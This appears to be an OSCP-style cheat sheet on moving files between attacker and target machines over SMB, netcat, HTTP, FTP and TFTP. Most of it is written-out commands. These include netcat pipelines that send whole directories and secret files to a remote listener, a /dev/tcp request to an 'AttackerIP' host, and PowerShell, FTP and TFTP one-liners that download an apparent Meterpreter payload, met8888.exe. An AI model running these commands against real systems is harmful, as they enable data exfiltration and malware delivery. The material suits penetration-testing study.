## Over SMB

- [https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py-](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py)

```
python impacket-smbserver.py test1 `pwd`
smbclient -L <local-ip> --no-pass
```

```
net view \\10.10.14.9
\\10.10.14.9\test1\test.exe
```

## Over NetCat

```
cat file.txt | nc 192.168.1.123 34567
```

```
nc -l -p 34567 > file.txt
```

## Tar over NetCat

```
# Send one file
tar cfv - file | nc 192.168.1.123 34567

# Send multiple files
tar cfv - file1 file2 file3 | nc 192.168.1.123 34567

# Send multiple files
tar cfv - *.doc | nc 192.168.1.123 34567

# Send this dir and subdirectories
tar cfv - * | nc 192.168.1.123 34567

# Send a specified directory
tar cfv - important_stuff/ | nc 192.168.1.123 34567

# Send a specified directory and maintain absolute dir structure
tar cfv - /home/joe | nc 192.168.1.123 34567
```

```
nc -l -p 34567 | tar xfv -
```

## GZIP over NetCat

```
tar cfv - file1 file2 file3 | gzip -c | nc 192.168.1.123 34567
```

```
nc -l -p 34567 | gunzip -c | tar xfv -
```

## Encrypted Tar over NetCat

```
openssl rand 9999 | shasum
```

```
tar cfv - secret_file.*.txt | gzip -c | openssl enc -aes-256-cbc -salt -k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd  -md md5 | nc 10.100.1.27 45678
```

```
nc -l -p 45678 | openssl enc -aes-256-cbc -d -k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd -md md5 | gunzip -c | tar xfv -
```

## Encrypted Tar over NetCat as Base64

```
tar cfv - secret_file.*.txt | gzip -c | openssl enc -aes-256-cbc -salt -a -k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd -md md5 | nc 10.100.1.27 45678
```

```
nc -l -p 45678 | openssl enc -aes-256-cbc -d -a -k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd -md md5 | gunzip -c | tar xfv -
```

## Pull file using NetCat

```
nc -q0 -l -p 5454 < potential_attack_vectors.txt
```

```
nc 192.168.100.185 5454 > potential_attack_vectors.txt
```

## Over HTTP

```
python -m SimpleHTTPServer  
```

```
(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
```

```
(echo -e "GET /filename_you_are_moving HTTP/0.9\r\n\r\n" \
1>&3 & cat 0<&3) 3 /dev/tcp/AttackerIP/80 \
| (read i; while [ "$(echo $i | tr -d '\r')" != "" ]; \
do read i; done; cat) > local_filename
```



## Over FTP

```
apt-get install python-pyftpdlib  
```

```
python -m pyftpdlib -p 21
OR
auxiliary/server/ftp
```

ftp_commands.txt:

```
open 10.9.122.8  
anonymous  
whatever  
binary  
get met8888.exe  
bye  
```

```
ftp -s:ftp_commands.txt
```

```
echo open 10.9.122.8>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get met8888.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
```

## Over TFTP

```
apt-get install atftpd
service atftpd start
```

```
auxiliary/server/tftp
```

```
pkgmgr /iu:"TFTP"  
tftp -i 10.9.122.8 GET met8888.exe
tftp -i 10.9.122.8 PUT met8888.exe
```



## References

- [https://h4ck.co/oscp-journey-exam-lab-prep-tips/](https://h4ck.co/oscp-journey-exam-lab-prep-tips/)
